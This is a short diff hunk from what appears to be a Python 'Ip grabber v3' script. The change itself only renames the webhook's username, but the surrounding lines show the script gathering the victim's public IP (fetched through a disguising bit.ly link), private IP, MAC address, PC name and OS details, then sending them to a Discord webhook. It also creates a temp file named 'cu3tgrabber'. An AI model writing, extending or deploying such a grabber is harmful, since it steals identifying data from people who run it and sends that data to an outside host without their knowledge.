@@ -30,7 +30,7 @@ ip = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()
 #bitly      -->      https://api.ipify.org/
 #
 # Sends the ip to an webhook
-webhook = DiscordWebhook(url=f'{hook}', username='Ip grabber', content=f'Ip grabber v3\n\nOperating system: {platform.system()}\nVersion: {platform.release()}\nPc Name: {pcname}\nMac Adress: {mac}\nPublic Ip Adress: {ip} \nPrivate Ip Adress: {Privateip}\n\nMade by <@738138455476797581>')
+webhook = DiscordWebhook(url=f'{hook}', username='Ip grabber v3  By cuet', content=f'Ip grabber v3\n\nOperating system: {platform.system()}\nVersion: {platform.release()}\nPc Name: {pcname}\nMac Adress: {mac}\nPublic Ip Adress: {ip} \nPrivate Ip Adress: {Privateip}\n\nMade by <@738138455476797581>')
 response = webhook.execute()
 #
 fd, cu3tgrabber = tempfile.mkstemp()
